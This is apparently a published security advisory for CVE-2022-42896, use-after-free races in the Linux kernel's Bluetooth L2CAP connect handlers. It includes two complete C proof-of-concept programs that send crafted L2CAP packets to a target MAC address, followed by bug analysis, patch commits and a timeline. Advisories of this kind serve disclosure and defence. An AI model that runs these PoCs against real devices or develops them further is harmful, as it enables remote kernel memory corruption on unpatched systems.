---
title: 'Linux Kernel: UAF in Bluetooth L2CAP Handshake'
severity: Moderate
ghsa_id: GHSA-pf87-6c9q-jvm4
cve_id: CVE-2022-42896
weaknesses: []
products:
- ecosystem: Linux
  package_name: Kernel
  affected_versions: '> v3.16.0'
  patched_versions: ''
cvss: null
credits:
- github_user_id: koczkatamas
  name: Tamás Koczka
  avatar: https://avatars.githubusercontent.com/u/2608082?s=40&v=4
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

### Summary
There are use-after-free vulnerabilities in the Linux kernel's `net/bluetooth/l2cap_core.c`'s `l2cap_connect` and `l2cap_le_connect_req` functions which may allow code execution and leaking kernel memory (respectively) remotely via Bluetooth.

The `l2cap_le_connect_req` bug was introduced in [commit 27e2d4c](https://github.com/torvalds/linux/commit/27e2d4c8d28be1d1b4ecfbffab572d7dbd35254d) (version: 3.12.0, date: 2013-Dec-05), the SMP channel is available since [commit 70db83c](https://github.com/torvalds/linux/commit/70db83c4bcdc1447bbcb318389561c90d7056b18) (version: 3.16.0, date: 2014-Aug-14).

### Severity
Moderate

### Proof of Concept
**UAF read in l2cap_le_connect_req**

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

typedef struct l2cap_le_conn_req {
        uint16_t     psm;
        uint16_t     scid;
        uint16_t     mtu;
        uint16_t     mps;
        uint16_t     credits;
} __attribute__ ((packed)) l2cap_le_conn_req;

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t data_length) {
  uint8_t type = HCI_ACLDATA_PKT;
  uint16_t BCflag = 0x0000;
  uint16_t PBflag = 0x0002;
  uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;

  hci_acl_hdr hdr;
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3];

  iv[0].iov_base = &type;
  iv[0].iov_len = 1;
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

#define L2CAP_CID_LE_SIGNALING  0x0005
#define L2CAP_LE_CONN_REQ       0x14
#define L2CAP_CID_SMP           0x0006
#define L2CAP_CID_SMP_BREDR     0x0007

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    return 1;
  }

  bdaddr_t dst_addr;
  str2ba(argv[1], &dst_addr);

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  struct hci_filter flt;
  hci_filter_clear(&flt);
  hci_filter_all_ptypes(&flt);
  hci_filter_all_events(&flt);
  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("setsockopt(HCI_FILTER)");
    return 1;
  }

  int opt = 1;
  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0) {
    perror("setsockopt(HCI_DATA_DIR)");
    return 1;
  }

  printf("[*] Connecting to victim...\n");

  struct sockaddr_l2 laddr = {0};
  laddr.l2_family = AF_BLUETOOTH;
  laddr.l2_bdaddr_type = BDADDR_LE_PUBLIC;
  laddr.l2_bdaddr = di.bdaddr;

  struct sockaddr_l2 raddr = {0};
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr_type = BDADDR_LE_PUBLIC;
  raddr.l2_bdaddr = dst_addr;

  int l2_sock;
  printf("[*] socket\n");
  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
    perror("socket");
    return 1;
  }

  printf("[*] bind\n");
  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
    perror("bind");
    return 1;
  }

  printf("[*] connect\n");
  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
    perror("connect");
    return 1;
  }

  printf("[*] getsockopt\n");
  struct l2cap_conninfo l2_conninfo;
  socklen_t l2_conninfolen = sizeof(l2_conninfo);
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen) < 0) {
    perror("getsockopt");
    return 1;
  }

  uint16_t hci_handle = l2_conninfo.hci_handle;
  printf("[+] HCI handle: %x\n", hci_handle);

  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_le_conn_req req;
  } packet = {0};
  packet.hdr.len = htobs(sizeof(packet) - L2CAP_HDR_SIZE);
  packet.hdr.cid = htobs(L2CAP_CID_LE_SIGNALING);
  packet.cmd_hdr.code = L2CAP_LE_CONN_REQ;
  packet.cmd_hdr.ident = 0x1;
  packet.cmd_hdr.len = sizeof(packet.req);
  packet.req.psm = htobs(0);
  packet.req.scid = htobs(0x42);
  packet.req.mtu = htobs(23);
  packet.req.mps = htobs(23);
  packet.req.credits = htobs(0xff);

  printf("[*] Sending malicious L2CAP packet...\n");
  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));

  close(l2_sock);
  hci_close_dev(hci_socket);

  return 0;
}
```

**UAF write in l2cap_connect**

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t data_length) {
  uint8_t type = HCI_ACLDATA_PKT;
  uint16_t BCflag = 0x0000;
  uint16_t PBflag = 0x0002;
  uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;

  hci_acl_hdr hdr;
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3];

  iv[0].iov_base = &type;
  iv[0].iov_len = 1;
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

#define L2CAP_CID_SIGNALING     0x0001
#define L2CAP_CONN_REQ          0x02
#define L2CAP_CID_SMP           0x0006
#define L2CAP_CID_SMP_BREDR     0x0007

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    return 1;
  }

  bdaddr_t dst_addr;
  str2ba(argv[1], &dst_addr);

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  struct hci_filter flt;
  hci_filter_clear(&flt);
  hci_filter_all_ptypes(&flt);
  hci_filter_all_events(&flt);
  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("setsockopt(HCI_FILTER)");
    return 1;
  }

  int opt = 1;
  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0) {
    perror("setsockopt(HCI_DATA_DIR)");
    return 1;
  }

  printf("[*] Connecting to victim...\n");

  struct sockaddr_l2 laddr = {0};
  laddr.l2_family = AF_BLUETOOTH;
  laddr.l2_bdaddr_type = BDADDR_BREDR;
  laddr.l2_bdaddr = di.bdaddr;

  struct sockaddr_l2 raddr = {0};
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr_type = BDADDR_BREDR;
  raddr.l2_bdaddr = dst_addr;

  int l2_sock;
  printf("[*] socket\n");
  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
    perror("socket");
    return 1;
  }

  printf("[*] bind\n");
  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
    perror("bind");
    return 1;
  }

  printf("[*] connect\n");
  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
    perror("connect");
    return 1;
  }

  printf("[*] getsockopt\n");
  struct l2cap_conninfo l2_conninfo;
  socklen_t l2_conninfolen = sizeof(l2_conninfo);
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen) < 0) {
    perror("getsockopt");
    return 1;
  }

  uint16_t hci_handle = l2_conninfo.hci_handle;
  printf("[+] HCI handle: %x\n", hci_handle);

  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conn_req req;
  } packet = {0};
  packet.hdr.len = htobs(sizeof(packet) - L2CAP_HDR_SIZE);
  packet.hdr.cid = htobs(L2CAP_CID_SIGNALING);
  packet.cmd_hdr.code = L2CAP_CONN_REQ;
  packet.cmd_hdr.ident = 0x1;
  packet.cmd_hdr.len = sizeof(packet.req);
  packet.req.psm = htobs(0);
  packet.req.scid = htobs(0x42);

  printf("[*] Sending malicious L2CAP packet...\n");
  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));

  close(l2_sock);
  hci_close_dev(hci_socket);

  return 0;
}
```
To make SMP available for BR/EDR devices (in case of a hardware supporting it is not available), you can force it by running: `echo Y > /sys/kernel/debug/bluetooth/hci0/force_bredr_smp`


### Further Analysis
**Bug Analysis**
There are UAF races in [l2cap_connect](https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/l2cap_core.c#L4113) and [l2cap_le_connect_req](https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/l2cap_core.c#L5789) methods. After a channel is created via the `new_connection` callback, it is not locked but `__set_chan_timer` sets up a timer which can call `l2cap_chan_timeout` and can cleanup the channel before the method finishes, causing [UAF read in l2cap_le_connect_req](https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/l2cap_core.c#L5899) and [UAF write in l2cap_connect](https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/l2cap_core.c#L4247).

As the channel timeout is normally [40 seconds](https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/include/net/bluetooth/l2cap.h#L55) (`L2CAP_CONN_TIMEOUT`), winning the race would be infeasible, but due to a bug in SMP's implementation, SMP channels [created by smp_new_conn_cb](https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/smp.c#L3241) have their `get_sndtimeo` callback set to `l2cap_chan_no_get_sndtimeo` which [returns 0](https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/include/net/bluetooth/l2cap.h#L964) as timeout value thus causing the timer to run immediately (on a different thread) after the `__set_chan_timer` call.

Note: in `l2cap_le_connect_req` (without `FLAG_DEFER_SETUP`), the timer is canceled via the `l2cap_chan_ready` call almost immediately after the `__set_chan_timer` call, but even this small time window enough for the timer with 0 timeout to start.

Another root cause of the issue can be that the SMP channel is available via `l2cap_global_chan_by_psm` if the request contains `psm=0`. Multiple channels can be registered without PSM (PSM is 0, and channel is identified by SCID) but only one of them is returned (which needs to be SMP to be able to trigger the vulnerability).

```c
static int l2cap_le_connect_req(...)
{
    ...
    mutex_lock(&conn->chan_lock);
    ...
    chan = pchan->ops->new_connection(pchan); // chan is not locked
    ...
    __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers l2cap_chan_timeout running from a different thread
    ...
    if (test_bit(FLAG_DEFER_SETUP, &chan->flags)) { // branch usually not taken
        ...
    } else {
        l2cap_chan_ready(chan); // calls __clear_chan_timer(chan), resets timer
        result = L2CAP_CR_LE_SUCCESS;
    }    
    ...
    mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked until this call
    ...
    if (chan) { // [7] UAF read
        rsp.mtu = cpu_to_le16(chan->imtu);
        rsp.mps = cpu_to_le16(chan->mps);
    } else {
    ...
}
```
Similar issue within `l2cap_connect`:

```c
static struct l2cap_chan *l2cap_connect(...)
{
    ...
    mutex_lock(&conn->chan_lock);
    ...
    chan = pchan->ops->new_connection(pchan); // chan is not locked
    ...
    __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers l2cap_chan_timeout running from a different thread
    ...
    mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked until this call
    ...
    if (chan && !test_bit(CONF_REQ_SENT, &chan->conf_state) && // UAF read
        result == L2CAP_CR_SUCCESS) {
        u8 buf[128];
        set_bit(CONF_REQ_SENT, &chan->conf_state); // UAF write
        l2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,
                   l2cap_build_conf_req(chan, buf, sizeof(buf)), buf);
        chan->num_conf_req++;
    }
    return chan;
}
```

The affected code path in SMP implementation:

```c
static inline struct l2cap_chan *smp_new_conn_cb(struct l2cap_chan *pchan)
{
    …
    chan->ops = &smp_chan_ops;
    …
}

static const struct l2cap_ops smp_chan_ops = {
    …
    .get_sndtimeo = l2cap_chan_no_get_sndtimeo,
    …
};

static inline long l2cap_chan_no_get_sndtimeo(struct l2cap_chan *chan)
{
    return 0;
}
```
**Reachability**
SMP channel is available for Bluetooth Low Energy since BT 4.0 (~2009) which can be used to trigger the UAF read in `l2cap_le_connect_req`, and it is also available for BT BR/EDR since BT 5.2 (~2020, to support Secure Connections) to trigger the UAF write in `l2cap_connect`.

No other prerequisites were found, the bugs were triggered on a KASAN-enabled Ubuntu 22.04 kernel (an artificial delay was added before the UAF read/write to make winning the race easier).

Note: it is possible that the bugs can be triggered via other channels which may be created automatically by the specific environment.

### Patch

The vulnerability was fixed by not accepting 0 as a valid PSM value in commit [711f8c3](https://github.com/torvalds/linux/commit/711f8c3fb3db61897080468586b970c87c61d9e4) and by preventing `l2cap_global_chan_by_psm` to give back `L2CAP_CHAN_FIXED` channels in commit [f937b75](https://github.com/torvalds/linux/commit/f937b758a188d6fd328a81367087eddbb2fce50f).

### Timeline
**Date reported**: 10/06/2022
**Date fixed**: 10/26/2022
**Date disclosed**: 11/28/2022